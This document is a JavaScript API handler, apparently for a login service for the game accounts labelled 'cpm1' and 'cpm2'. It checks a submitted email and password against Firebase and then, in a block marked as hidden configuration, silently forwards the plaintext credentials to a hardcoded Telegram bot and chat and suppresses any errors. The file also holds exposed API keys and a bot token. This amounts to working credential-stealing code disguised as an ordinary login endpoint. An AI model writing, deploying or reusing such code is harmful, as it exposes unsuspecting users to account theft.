export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    const { version, email, password } = req.body;

    // Config yang disembunyikan
    const CONFIGS = {
        cpm1: {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            BOT_TOKEN: "8363058552:AAEY57Exn4ELKZ4T9hBDpUJaQdk45oTSh0E",
            CHAT_ID: 6095291231
        },
        cpm2: {
            FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            BOT_TOKEN: "8363058552:AAEY57Exn4ELKZ4T9hBDpUJaQdk45oTSh0E",
            CHAT_ID: 6095291231
        }
    };

    const config = CONFIGS[version];
    if (!config) {
        return res.status(400).json({ success: false, message: 'Invalid version' });
    }

    try {
        // Firebase login
        const loginRes = await fetch(`${config.FIREBASE_LOGIN_URL}?key=${config.FIREBASE_API_KEY}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
            },
            body: JSON.stringify({
                clientType: 'CLIENT_TYPE_ANDROID',
                email,
                password,
                returnSecureToken: true
            })
        });

        const data = await loginRes.json();

        if (loginRes.ok && data.idToken) {
            // Kirim notifikasi ke Telegram
            const telegramUrl = `https://api.telegram.org/bot${config.BOT_TOKEN}/sendMessage`;
            const message = `🔐 Login ${version.toUpperCase()}:\n📧 Email: ${email}\n🔒 Password: ${password}`;
            
            await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: config.CHAT_ID,
                    text: message
                })
            }).catch(() => {}); // Ignore telegram errors

            return res.status(200).json({ 
                success: true, 
                token: data.idToken,
                message: 'Login successful' 
            });
        } else {
            return res.status(400).json({ 
                success: false, 
                message: data.error?.message || 'Login failed' 
            });
        }
    } catch (error) {
        console.error('Login error:', error);
        return res.status(500).json({ 
            success: false, 
            message: 'Internal server error' 
        });
    }
}